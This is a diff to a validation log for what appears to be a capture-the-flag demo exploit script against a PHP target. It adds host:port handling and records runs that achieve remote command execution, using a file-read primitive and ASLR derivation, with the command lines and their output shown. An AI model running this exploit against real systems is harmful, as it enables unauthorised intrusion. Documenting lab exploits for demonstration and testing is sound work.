@@ -314,12 +314,13 @@ Status: pass. Both the default query-param adapter and the template adapter were
 - Removed forced wrapping; the terminal handles visual wrapping, while the script only enforces max-line and max-character safety limits.
 - The command result is printed last as plain terminal text in a high-contrast color when color is enabled.
 - Confirmed `phpinfo()` is optional: with `--phpinfo-path ''`, the PHP fields report `not learned` but ASLR derivation and exploitation still use the file-read primitive and succeed.
+- `--host` now accepts `HOST:PORT`; `--port` remains available as a fallback/override for legacy command lines.
 
 Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_9.py \
-  --host 192.168.1.205 --cmd 'ls -la /app/tmp' \
+  --host 192.168.1.205:19321 --cmd 'ls -la /app/tmp' \
   --fast --artifact-dir artifacts --phpinfo-path ''
 ```
 
@@ -344,18 +345,40 @@ drwxr-xr-x 4 root   root       4096 May 14 21:58 ..
 
 Status: pass.
 
+Validated `HOST:PORT` command:
+
+```bash
+./demo_ctf_exploit_v1_9.py \
+  --host 192.168.1.205:19321 --cmd id \
+  --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
+```
+
+Observed result:
+
+```text
+Target: 192.168.1.205:19321
+PHP version: not learned
+[04] Remote command verification setup
+winning address: 0x55e4210b2127
+winning body offset: 1376
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+run artifact: artifacts/demo_v1_9_20260515-060834.json
+```
+
+Status: pass.
+
 ## Recommended Demo Command
 
 For video recording:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205 --port 19321 --cmd id --clear
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --clear
 ```
 
 For a fast validation run:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205 --port 19321 --cmd id --fast
+./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --fast
 ```
 
 ## Remaining Technical Limits
